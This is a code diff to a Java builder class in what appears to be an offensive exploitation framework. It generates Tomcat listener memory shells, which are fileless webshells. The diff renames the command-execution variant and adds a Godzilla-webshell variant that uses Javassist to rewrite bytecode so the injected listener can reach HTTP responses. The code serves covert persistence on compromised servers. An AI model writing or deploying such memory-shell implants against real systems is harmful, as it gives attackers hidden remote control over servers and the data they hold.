@@ -3,6 +3,7 @@ package com.ppp.middleware.builder;
 import com.ppp.JavaClassHelper;
 import com.ppp.annotation.Builder;
 import com.ppp.annotation.MemShell;
+import com.ppp.annotation.MemShellFunction;
 import com.ppp.annotation.Middleware;
 import com.ppp.utils.maker.JavaClassUtils;
 import javassist.ClassClassPath;
@@ -17,7 +18,8 @@ import javassist.CtMethod;
 @Middleware(Middleware.Tomcat)
 public class TomcatMSJavaClassBuilder {
     @MemShell(MemShell.Listener)
-    public byte[] listener(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+    @MemShellFunction(MemShellFunction.Exec)
+    public byte[] listenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(cls));
         classPool.importPackage("javax.servlet.http");
@@ -55,10 +57,26 @@ public class TomcatMSJavaClassBuilder {
         JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);
 
         return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper);
+    }
 
-//        byte[] classBytes = ctClass.toBytecode();
-//        return classBytes;
-//        String b64 = Encoder.base64encoder(classBytes);
-//        return b64;
+    @MemShell(MemShell.Listener)
+    @MemShellFunction(MemShellFunction.Godzilla)
+    public byte[] listenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.importPackage("javax.servlet.http");
+
+        CtClass ctClass = classPool.getCtClass(cls.getName());
+
+        // response
+        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
+        responseCtMethod.setBody("{Object request = getFieldValue($1, \"request\");\n" +
+                "Object httpServletResponse = getFieldValue(request, \"response\");\n" +
+                "return httpServletResponse;}");
+
+        // 字段信息修改
+        JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);
+
+        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper);
     }
 }
